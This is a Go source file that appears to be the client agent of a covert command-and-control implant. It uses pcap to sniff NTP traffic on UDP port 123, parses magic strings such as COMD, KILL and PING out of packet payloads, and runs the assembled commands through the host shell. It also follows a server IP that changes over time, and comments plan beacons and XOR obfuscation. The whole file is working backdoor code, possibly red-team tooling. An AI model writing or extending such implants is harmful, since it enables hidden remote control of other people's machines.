package handler

import (
	"bytes"
	"fmt"
	"log"
	"mesa/goclient/pkg/agent"
	"os/exec"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

func StartSniffer(newAgent agent.Agent) {
	msg := ""
	for {

		var (
			iface  = newAgent.IFace
			buffer = int32(1600)
			filter = "udp and port 123" //note for myself: listening for any NTP traffic, magic string search
			//when i send ping (from server) for the first time, it should take note of my IP and call setup. store that for beacons
			//if i ping again from a different IP, calls setup again with the new IP. fixes the ntp.fun dns issue
		)

		handler, err := pcap.OpenLive(iface, buffer, false, pcap.BlockForever)
		if err != nil {
			log.Fatal(err)
		}

		defer handler.Close()

		if err := handler.SetBPFFilter(filter); err != nil {
			log.Fatal(err)
		}

		source := gopacket.NewPacketSource(handler, handler.LinkType())
		for packet := range source.Packets() {
			ret, cont := harvestInfo(packet)
			if strings.Contains(cont, "COM") {
				msg += ret
			}

			if cont == "COMD" {
				runCommand(msg, newAgent)
				msg = ""
			} else if cont == "KILL" {
				//TODO add start shutdown
			} else if cont == "PING" { //resync
				fmt.Println(string(newAgent.ServerIP))
				fmt.Println(ret)
				if ret != string(newAgent.ServerIP) { //solves DHCP issue
					newAgent.ServerIP = []byte(ret)
					agent.Setup(newAgent)
				} else {
					Resync(newAgent)
				}

				fmt.Println("ping. serverip: ", newAgent.ServerIP)

			} else {
				continue
			}
		}
	}

}

func harvestInfo(packet gopacket.Packet) (string, string) {
	ipLayer := packet.NetworkLayer()
	ipLayerBytes := ipLayer.LayerContents()
	srcIP := ipLayer.LayerContents()[len(ipLayerBytes)-8 : len(ipLayerBytes)-4]
	app := packet.ApplicationLayer()
	if app != nil {
		final := decode(app.LayerContents())
		index := strings.Index(final, "COM")
		if strings.Contains(final, "COMU") {
			return final[index+4:], "COMU"
		} else if strings.Contains(final, "COMD") {
			return final[index+4:], "COMD"
		} else if strings.Contains(final, "KILL") {
			return "", "KILL"
		} else if strings.Contains(final, "PING") {
			return string(srcIP), "PING" //TODO server auto pings agent if goes to MIA, hoping for change response. also updates NTP server information on box
		}
	}
	return "ignore", "ignore"
}

func runCommand(msg string, newAgent agent.Agent) {
	fmt.Print("Command: ")
	fmt.Println(msg)
	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, msg).Output()

	if err != nil {
		fmt.Println(err.Error())
		fmt.Println("Couldn't execute command")
	}

	fmt.Println(string(output))
}

func Resync(newAgent agent.Agent) {
	var command string
	if newAgent.OpSys == "Windows" {
		command = "w32tm /resync"
	} else {
		command = "echo resync time" //TODO actual linux command
	}

	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, command).Output()

	if err != nil {
		fmt.Println(err.Error())
		fmt.Println("Couldn't execute command")
	}

	fmt.Println(string(output))
}

func decode(content []byte) string {
	content = bytes.Trim(content, "\x00")
	return string(content)
	//TODO fix later with single XOR byte
}

func Heartbeat(newAgent agent.Agent) {
	if newAgent.OpSys == "Windows" {
		runCommand("w32tm /resync", newAgent)
	} else {
		runCommand("echo yeah ill add this funct eventually", newAgent) //TODO actual linux command
	}
}

//encode/decode/craft packets
/*
func Encode(data string) Packet { //fix args

}*/

//More notes for myself
//server will run on two main threads: listening for connections (always) -> action thread. And prompt.
//client will run on two main threads: sniffing traffic (always) and then responding to said traffic. maybe split the second part up into more strings too
